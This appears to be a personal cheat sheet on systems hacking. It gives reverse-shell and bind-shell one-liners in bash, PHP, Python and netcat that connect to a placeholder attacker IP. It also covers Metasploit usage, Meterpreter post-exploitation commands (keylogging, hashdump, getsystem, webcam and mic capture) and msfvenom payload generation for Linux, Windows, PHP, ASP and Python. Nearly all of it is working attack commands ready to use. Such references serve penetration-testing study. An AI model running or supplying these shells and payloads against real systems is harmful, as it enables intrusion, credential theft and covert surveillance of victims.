# Notes on systems hacking

"If it’s not possible to add a new account / SSH key / .rhosts file and just log in, your next step is likely to be either trowing back a reverse shell or binding a shell to a TCP port."

– [Reverse shell cheat sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

| shell type | listener on |
| ---------- | ----------- |
| reverse shell | attacker's machine |
| bind shell | target machine |

## Netcat reverse shell

### Listener

```bash
# listen for a connection on port 443
# it's better to use known ports to blend in with legitimate traffic
$ nc -lvnp 443

# wrap nc with rlwrap for arrow keys, history, better interaction
$ rlwrap nc -lnvp 443

# ncat is improved version of netcat from the nmap project
# provides extra features such as SSL encryption
$ ncat --ssl -lnvp 4444
```

| Flag | Description |
| ---- | ----------- |
| -l   | listen for a connection |
| -v   | verbose     |
| -n   | skip DNS lookup |
| -p   | port number |

```bash
# create a socket connection between two hosts
# listen for a reverse shell, direct incoming data to the terminal
# -d -d is for double verbosity level
$ socat -d -d TCP-LISTEN:443 STDOUT
```

### Normal bash reverse shell

```bash
# redirect input & output through tcp to the attacker's IP on port 443
# combine both standard output and standard error
$ bash -i >& /dev/tcp/<attacker_ip>/433 0>&1
```

### Bash read line reverse shell

```bash
# creates a new file descriptor and connects to a tcp socket.
# It will read & execute commands from the socket
# and send output back through the same socket
$ exec 5<>/dev/tcp/<attacker_ip>/443; cat <&5 | while read line; do $line 2>&5 >&5; done 
```

### Bash with file descriptor 196 reverse shell

```bash
# allows the shell to read commands from the network
# and send output back through the same connection
$ 0<&196;exec 196<>/dev/tcp/<attacker_ip>/443; sh <&196 >&196 2>&196 
```

### Bash with file descriptor 5 reverse shell

```bash
# uses file descriptor 5 to enable interactive session over tcp
$ bash -i 5<> /dev/tcp/<attacker_ip>/443 0<&5 1>&5 2>&5
```

### PHP reverse shells

```bash
# can also use "shell_exec", "system", "passthrough", "popen"
# instead of "exec"
$ php -r '$sock=fsockopen("<attacker_ip>",443);exec("sh <&3 >&3 2>&3");'
```

### Python reverse shells

```bash
# sets remote host and port as environment variables
# creates socket connection, duplicates the socket file descriptor
# for standard input/output
export RHOST="<attacker_ip>"; export RPORT=443; python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'

# uses the subprocess module to spawn a shell
# set environment variables
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker_ip>",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'

# creates a socket s, redirects standard input/output/error to the socket
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("<attacker_ip>",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
```

### Pipe reverse shell

```bash
# rm existing pipe, create two-way named FIFO pipe at /tmp/f,
# cat output from the pipe, pipe output to shell instance,
# redirect standard error to standard output (back to the attacker),
# pipe shell's output through netcat to attacker's machine,
# send output of commands back into the named pipe (bi-directional communication) 
$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc <attacker_ip> <attacker_port> >/tmp/f
```

### Bind shell

Binding a port on the compromised system to expose a shell can lead to detection more easily because a bind shell must remain active and listen to connections.

```bash
# expose a bash shell on the target machine through a netcat listener on all interfaces
# ports below 1024 will require netcat to be executed with elevated privileges, using port 8080 avoids this
$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f

# connect to the bind shell (skip DNS, verbose)
$ nc -nv <target_ip> 8080
```

## Metasploit

#### Basic usage:

```bash
# launch metasploit framework console
$ msfconsole

# search modules
msf6> search <keyword>

# select a module from the search results
msf6> use <number>

# nmap can be run inside msfconsole
msf6> nmap -sV <IP> -n

# set global parameters
msf6> setg rhosts <ip_addr || list_of_IPs.txt>

# show available payloads for the selected exploit
msf6> show payloads
# set payload from the list
msf6> set payload <number>

# run the selected exploit, scanner, etc.
msf6(module_name)> exploit
msf6(module_name)> run

# list opened sessions
msf6> sessions
# attach to a session
msf6> sessions <number>
```

#### Metasploit database management:

```bash
$ systemctl start postgresql

# initialize the Metasploit Database as postgres (non-root user)
$ sudo -u postgres msfdb init

# delete the database
$ sudo -u postgres msfdb delete

# database status
msf6> db_status

# list  available workspaces
msf6> workspace

# add workspace (-d to delete)
msf6> workspace -a <workspace_name>

# switch to workspace
msf6> worspace <workspace_name>

# store nmap scans in the db
msf6> db_nmap -sV -p- <ip_addr>

# see hosts & services running on target systems (from db)
msf6> hosts
msf6> services

# set RHOSTS from db (all saved hosts)
msf6> hosts -R
```

----------------------------------------------------------------

## Meterpreter

#### Basic usage:

```bash
# see available commands on the target system
meterpreter> help

# system info
meterpreter> sysinfo

# list running processes
meterpreter> ps

# migrate meterpreter to another process
# note that you may lose system privileges to that of a user
meterpreter> migrate <PID>

# keylogger (in the running process)
meterpreter> keyscan_start
meterpreter> keyscan_stop
meterpreter> keyscan_dump

# attempt privilege escalation to system level
meterpreter> getsystem

# load tools like python, kiwi (mimikatz)
meterpreter> load python
meterpreter> python_execute "<python command>"

# search for a file in the target filesystem
meterpreter> search -f <filename>

# edit a file
meterpreter> edit <filepath>

# dowload a file or a directory
meterpreter> download <remote_filepath>

# upload a file or a directory
meterpreter> upload <local_filepath>

# drop to a shell
# Ctrl+Z to get back to meterpreter
meterpreter> shell

# display the host ARP cache
meterpreter> arp

# forward a local port to remote service
meterpreter> portfwd

# view and modify the routing table
meterpreter> route

# get NTLM password hashes
# the hashes may not be crackable but can be found in rainbow tables
# or the hashes can be used in pass-the-hash attacks
meterpreter> hashdump

# see the screen of the target machine
meterpreter> screenshare

# take a screenshot
meterpreter> screenshot

# record the mic of the target machine
meterpreter> record_mic

# take a picture with a connected webcam
meterpreter> webcam_snap

# see stream from the webcam
meterpreter> webcam_stream
```

----------------------------------------------------------------

## Msfvenom

Generate payloads in many different formats (PHP, exe, dll, elf, etc.) for many different target systems. All payloads available in the Metasploit framework.

```bash
# list available payloads
$ msfvenom -l payloads
# list formats
$ msfvenom -l formats

# encode php meterpreter payload into base64
$ msfvenom -p php/meterpreter/reverse_tcp LHOST=<ip-addr> -f raw -e php/base64
```

### Generating reverse payloads based on target system's configuration

```bash
# Linux (elf)
$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<ip_addr> LPORT=<port_number> -f elf > reverse_shell.elf

# Windows
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip_addr> LPORT=<port_number> -f exe > rev_shell.exe

# PHP
msfvenom -p php/meterpreter_reverse_tcp LHOST=<ip_addr> LPORT=<port_number> -f raw > rev_shell.php

# ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip_addr> LPORT=<port_number> -f asp > rev_shell.asp

# Python
msfvenom -p cmd/unix/reverse_python LHOST=<ip_addr> LPORT=<port_number> -f raw > rev_shell.py
```

### Catching a reverse shell

```bash
# generate reverse shell payload
# the starting php tag is commented out and the end tag is missing in the generated file.
# the file must be modified to convert it into a working PHP file  
msfvenom -p php/reverse_php LHOST=<ip_addr> LPORT=7777 -f raw > reverse_shell.php
```

```php
<?php

?>
```

```bash
msf6> use exploit/multi/handler
msf6> set LPORT 7777

# run the handler in the background to be able to attach to the session later
msf6> run -z

```